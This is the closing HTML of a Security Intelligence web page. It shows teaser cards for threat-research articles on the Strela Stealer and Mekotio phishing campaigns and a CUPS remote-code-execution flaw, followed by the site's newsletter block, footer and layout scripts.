            <a class="exclusive_article__category_link" href="https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/">
                <div class="article__img">
                                    <amp-img alt="closeup on a digital screen with a red envelope & the word phishing in yellow & 2 yellow warning symbols" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/11/Phishing.-financial-concept.-Digital-payments-630x330.jpeg.webp">
                    <amp-img fallback alt="closeup on a digital screen with a red envelope & the word phishing in yellow & 2 yellow warning symbols" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/11/Phishing.-financial-concept.-Digital-payments-630x330.jpeg">
                    </amp-img>
                </amp-img>
                            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                <!-- CAT AND DATE -->
                <div class="article__eyebrow">
                                        <span class="article__date">
                        November 12, 2024                    </span>
                </div>
                <!-- TITLE & EXCERPT -->
                <a href="https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/" class="article__content_link">
                    <div class="article__direction">
                        <h2 class="article__title">
                            Strela Stealer: Today&#8217;s invoice is tomorrow&#8217;s phish                        </h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                            <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 12</span> <span class="rt-label rt-postfix">min read</span></span> - </span>As of November 2024, IBM X-Force has tracked ongoing Hive0145 campaigns delivering Strela Stealer malware to victims throughout Europe - primarily Spain, Germany and Ukraine. The phishing emails used in these campaigns are real invoice notifications, which have been stolen through previously exfiltrated email credentials. Strela Stealer is designed to extract user credentials stored in Microsoft Outlook and Mozilla Thunderbird. During the past 18 months, the group tested various techniques to enhance its operation's effectiveness. Hive0145 is likely to be&hellip;                        </p>
                    </div>
                </a>
            </div>
        </article>
      
<article class="article article--card cards__article_grid ">
            <!-- IMG -->
            <a class="exclusive_article__category_link" href="https://securityintelligence.com/x-force/hive0147-serving-juicy-picanha-with-side-of-mekotio/">
                <div class="article__img">
                                    <amp-img alt="Closeup on a laptop screen displaying green code in a dimly red-lit room" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/10/Closeup-on-modern-female-with-laptop-writing-code-630x330.jpeg.webp">
                    <amp-img fallback alt="Closeup on a laptop screen displaying green code in a dimly red-lit room" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/10/Closeup-on-modern-female-with-laptop-writing-code-630x330.jpeg">
                    </amp-img>
                </amp-img>
                            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                <!-- CAT AND DATE -->
                <div class="article__eyebrow">
                                        <span class="article__date">
                        October 16, 2024                    </span>
                </div>
                <!-- TITLE & EXCERPT -->
                <a href="https://securityintelligence.com/x-force/hive0147-serving-juicy-picanha-with-side-of-mekotio/" class="article__content_link">
                    <div class="article__direction">
                        <h2 class="article__title">
                            Hive0147 serving juicy Picanha with a side of Mekotio                        </h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                            <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 17</span> <span class="rt-label rt-postfix">min read</span></span> - </span>IBM X-Force tracks multiple threat actors operating within the flourishing Latin American (LATAM) threat landscape. X-Force has observed Hive0147 to be one of the most active threat groups operating in the region, targeting employee inboxes at scale, with a primary focus on phishing and malware distribution. After a 3-month break, Hive0147 returned in July with even larger campaign volumes, and the debut of a new malicious downloader X-Force named "Picanha,” likely under continued development, deploying the Mekotio banking trojan. Hive0147&hellip;                        </p>
                    </div>
                </a>
            </div>
        </article>
      
<article class="article article--card cards__article_grid ">
            <!-- IMG -->
            <a class="exclusive_article__category_link" href="https://securityintelligence.com/news/fysa-critical-rce-flaw-in-gnu-linux-systems/">
                <div class="article__img">
                                    <amp-img alt="Closeup on a red computer screen displaying code covered by a large ALERT message" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/07/computer-security-630x330.jpeg.webp">
                    <amp-img fallback alt="Closeup on a red computer screen displaying code covered by a large ALERT message" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/07/computer-security-630x330.jpeg">
                    </amp-img>
                </amp-img>
                            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                <!-- CAT AND DATE -->
                <div class="article__eyebrow">
                                        <span class="article__date">
                        September 26, 2024                    </span>
                </div>
                <!-- TITLE & EXCERPT -->
                <a href="https://securityintelligence.com/news/fysa-critical-rce-flaw-in-gnu-linux-systems/" class="article__content_link">
                    <div class="article__direction">
                        <h2 class="article__title">
                            FYSA &#8211; Critical RCE Flaw in GNU-Linux Systems                        </h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                            <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 2</span> <span class="rt-label rt-postfix">min read</span></span> - </span>Summary The first of a series of blog posts has been published detailing a vulnerability in the Common Unix Printing System (CUPS), which purportedly allows attackers to gain remote access to UNIX-based systems. The vulnerability, which affects various UNIX-based operating systems, can be exploited by sending a specially crafted HTTP request to the CUPS service. Threat Topography Threat Type: Remote code execution vulnerability in CUPS service Industries Impacted: UNIX-based systems across various industries, including but not limited to, finance, healthcare,&hellip;                        </p>
                    </div>
                </a>
            </div>
        </article>
              </div>
    </section>
</div>
<!--SI Newsletters -->
<script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/version/v1.31.0-rc.0/cta-section.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/tag/v1/latest/cta-section.min.js"></script>
      <script type="module" src="https://1.www.s81c.com/common/carbon-for-ibm-dotcom/tag/v1/next/cta-section.min.js"></script>
      <div style="background-color: #161616;">
      <dds-cta-section data-autoid="dds--cta-section" children-custom-class="" class="container SI_padding">
                  <dds-cta-block no-border="" data-autoid="dds--cta-block">
                        <dds-content-block-heading class="copy" role="heading" aria-level="2" data-autoid="dds--content-block__heading" slot="heading">
                        <h2 >Topic updates</h2>
                        </dds-content-block-heading>
                        
                              <dds-content-block-copy data-autoid="dds--content-block__copy" size="md" slot="copy">
                                    <dds-content-block-paragraph data-autoid="dds--content-block-paragraph" class="copy">
                                    Get email updates and stay ahead of the latest threats to the security landscape, thought leadership and research.
                                    </dds-content-block-paragraph>
                                    <div role="list" class="list_newletter">
                                          <dds-button-cta data-autoid="dds-cta" cta-style="button" class="copy" cta-type="local" href="https://www.ibm.com/account/reg/us-en/signup?formid=news-urx-51966" kind="primary" icon-layout="" size="">
                                                Subscribe today
                                          </dds-button-cta>
                                    </div>
                              </dds-content-block-copy>    
                  </dds-cta-block>
            </dds-cta-section>
      </div>
            
      <dds-footer-container></dds-footer-container>
      <script>
            
            document.addEventListener('DOMContentLoaded', () => {
            const boxstyle = document.querySelector('.button2');
            const removePadding = document.querySelector('dds-cta-section');
            
            if (boxstyle) {
                  const shadowRoot = boxstyle.shadowRoot;
                  const bxContentSsectionDOM = shadowRoot.querySelector('.bx--btn');
			 if (bxContentSsectionDOM) {
                        bxContentSsectionDOM.style.color = 'white'; 
                        bxContentSsectionDOM.style.borderColor = 'white'; 
                        bxContentSsectionDOM.addEventListener('mouseover', () => {
                        bxContentSsectionDOM.style.color = 'white';
                        bxContentSsectionDOM.style.borderColor = 'white';
                        bxContentSsectionDOM.style.backgroundColor = 'rgba(141, 141, 141, 0.16)'; //
                        
                        });

                        // when mouse leave the element
                        bxContentSsectionDOM.addEventListener('mouseout', () => {
                        bxContentSsectionDOM.style.color = 'white';
                        bxContentSsectionDOM.style.borderColor = 'white';
                        bxContentSsectionDOM.style.backgroundColor = 'transparent'; // Reset background color
                        });
		      }
            
            }
            if(removePadding){
                  const shadowRoot = removePadding.shadowRoot;
                  const removespace = shadowRoot.querySelector('.bx--content-section__leading');
                  if(removespace){
                        removespace.style.display = 'none';
                  }
            }
            });

            document.querySelector("dds-footer-container").size = 'default';

            //Uncomment this to add a custom links.
            // document.querySelector("dds-footer-container").adjunctLinks = [{
            //             'title': 'IBM Custom Link',
            //             'link': 'https://ibm.com'
            //       },
            //       {
            //             'title': 'IBM Custom Link2',
            //             'link': 'https://ibm.com'
            //       }
            // ];
      </script>
<!--SI close Newsletters-->

      <div style="background-color: #13171a;">
            <div class="container">

                  <!-- FOOTER -->
                  <section id="footer" class="footer">
                        <!-- LOGO -->
                        <div class="footer__logo">
                              <amp-img width="280" height="31" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/logo-white.svg" alt="Security Intelligence"></amp-img>
                        </div>

                        <!-- COPY  -->
                        <div class="footer__copy"><p>Analysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.</p>
</div>

                        <!-- LINKS -->
                        <div class="footer__list">
                              <a href="/news/" class="footer__link">Cybersecurity News</a>
                              <a href="/category/topics/" class="footer__link">By Topic</a>
                              <a href="/category/industries/" class="footer__link">By Industry</a>
                              <a href="/series/" class="footer__link">Exclusive Series</a>
                              <a href="/x-force/" class="footer__link">X-Force</a>
                              <a href="/media/" class="footer__link">Podcast</a>
                              <a href="/events/" class="footer__link">Events</a>
                              <a href="/about-us/" class="footer__link">Contact</a>
                              <a href="/about-us/" class="footer__link">About Us</a>
                        </div>


                        <!-- SOCIAL NETWORKS -->
                        <div class="footer__social-networks">
                              <div class="headline">Follow us on social</div>

                              <a href="http://www.twitter.com/ibmsecurity" aria-label="Twitter" class="footer__icon" style="left:-4px;">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 28 28" fill="#FFFFFF">
                                          <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
                                    </svg>
                              </a>
                              <a href="http://www.linkedin.com/company/ibm-security" aria-label="LinkedIn" class="footer__icon" style="justify-self: center;">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 28 28" fill="#FFFFFF">
                                          <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
                                    </svg>
                              </a>
                              <a href="https://www.youtube.com/@IBMTechnology" aria-label="YouTube" class="footer__icon" style="justify-self: end;">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 28 28" fill="#FFFFFF">
                                          <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z" />
                                    </svg>
                              </a>
                        </div>

                  </section>
            </div>
      </div>


      <div style="background-color:black">
            <div class="container">

                  <!-- UTILITIES BAR -->
                  <section class="utility_bar">

                        <!-- LINKS -->
                        <div class="utility_bar__links" aria-label="Footer Navigation">
                              <a href="http://www.ibm.com?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US" target="_blank" rel="noopener, noreferrer">© 2024 IBM</a>
                              <a href="https://www.ibm.com/contact/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US" target="_blank" rel="noopener, noreferrer">Contact</a>
                              <a href="https://www.ibm.com/privacy/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US" target="_blank" rel="noopener, noreferrer">Privacy</a>
                              <a href="https://www.ibm.com/legal/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&cm_mc_uid=03001744655915532865554&cm_mc_sid_50200000=84159441565120380187" target="_blank" rel="noopener, noreferrer">Terms of use</a>
                              <a href="https://www.ibm.com/accessibility/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US" target="_blank" rel="noopener, noreferrer">Accessibility</a>
                              <a href="#" onclick="truste.eu.clickListener();return false;" target="_blank" rel="noopener, noreferrer">Cookie Preferences</a>
                        </div>

                        <!-- Sponsor credits -->
                        <div class="utility_bar__sponsor">
                              <a href="http://ibm.com/security?ce=ISM0484&amp;ct=SWG&amp;cmp=IBMSocial&amp;cm=h&amp;cr=Security&amp;ccy=US" target="_blank" data-icon="B" class="icon ibm" rel="noopener, noreferrer" style="padding-right:0px">
                                    <span>Sponsored by
                                          <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 31.97 14.06">
                                                <defs>
                                                      <style>
                                                            .cls-1 {
                                                                  fill: #fff;
                                                            }
                                                      </style>
                                                </defs>
                                                <title>si-icon-eightbarfeature</title>
                                                <path class="cls-1" d="M27.17,12.6h4.21v.84H27.17Zm0-1.68h4.21v.84H27.17Zm0-1.68h2.52v.84H27.17Zm0-1.69h2.52V8.4H27.17Zm0-1.68h2.52v.84H27.17Zm-.84-4.2.28-.85h4.77v.85Zm-.56,1.68.29-.84h5.32v.84ZM25.22,5l.28-.84h4.19V5Zm-.56,1.68L25,5.87h2.22l-.27.84Zm0,6.73-.28-.84H25Zm-.55-1.68-.29-.84H25.5l-.28.84Zm-.56-1.68-.27-.84H26l-.27.84ZM23,8.4l-.29-.85h3.9l-.28.85Zm-.57-1.69-.27-.84h2.22l.28.84Zm-2.8,2.53h2.53v.84H19.63Zm0-1.69h2.53V8.4H19.63Zm0-1.68h2.53v.84H19.63Zm0-.84V4.19h4.19l.29.84ZM18,12.6h4.21v.84H18Zm0-1.68h4.21v.84H18Zm0-7.57V2.51h5.32l.28.84Zm0-1.68V.82h4.76l.29.85ZM14.16,9.24H17a2.23,2.23,0,0,1,.07.37,2.49,2.49,0,0,1,0,.47H14.16Zm0-5h2.95a2.38,2.38,0,0,1,0,.46A2.18,2.18,0,0,1,17,5H14.16ZM9.11,9.24h2.52v.84H9.11Zm0-1.69H16a5,5,0,0,1,.4.4,2,2,0,0,1,.32.45H9.11Zm0-1.68h7.57a2,2,0,0,1-.32.45,4.89,4.89,0,0,1-.4.39H9.11Zm0-1.68h2.52V5H9.11ZM7.42,12.6H16a3.09,3.09,0,0,1-1,.62,3.73,3.73,0,0,1-1.32.22H7.42Zm0-1.68H17a2.47,2.47,0,0,1-.15.46,2.24,2.24,0,0,1-.21.38H7.42Zm0-8.41h9.22a1.91,1.91,0,0,1,.21.38,2.47,2.47,0,0,1,.15.46H7.42Zm0-1.69H13.6a3.73,3.73,0,0,1,1.32.23,3.09,3.09,0,0,1,1,.62H7.42Zm-5,8.42H4.9v.84H2.38Zm0-1.69H4.9V8.4H2.38Zm0-1.68H4.9v.84H2.38Zm0-1.68H4.9V5H2.38ZM.69,12.6H6.58v.84H.69Zm0-1.68H6.58v.84H.69Zm0-8.41H6.58v.84H.69ZM.69.82H6.58v.85H.69Z" />
                                          </svg>
                                    </span>
                              </a>
                        </div>
                  </section>

            </div>
      </div>


<script>
      </script>


<!-- FOOTER SCRIPTS -->
<script type="text/javascript" id="qppr_frontend_scripts-js-extra">
/* <![CDATA[ */
var qpprFrontData = {"linkData":{"https:\/\/securityintelligence.com\/defining-security-intelligence\/":[0,0,"https:\/\/securityintelligence.com\/defintion-security-intelligence\/#.VS_NwpNnuZA"],"https:\/\/securityintelligence.com\/security-vulnerability-management-its-about-outcomes-not-activity\/":[0,0,""]},"siteURL":"https:\/\/securityintelligence.com","siteURLq":"https:\/\/securityintelligence.com"};
/* ]]> */
</script>
<script type="text/javascript" src="https://securityintelligence.com/wp-content/plugins/quick-pagepost-redirect-plugin/js/qppr_frontend_script.min.js?ver=5.2.4" id="qppr_frontend_scripts-js"></script>

<script>
      setTimeout(() => {
            document.querySelector(".related_content").style.visibility = 'visible';
            document.querySelector(".related_content.article.article_grid.article__mobile--card.article--IBM_blog > c4d-card > c4d-card-footer").shadowRoot.querySelector("#link").style.justifyContent = 'flex-start';
      }, 100);

</script>

</body>

</html>
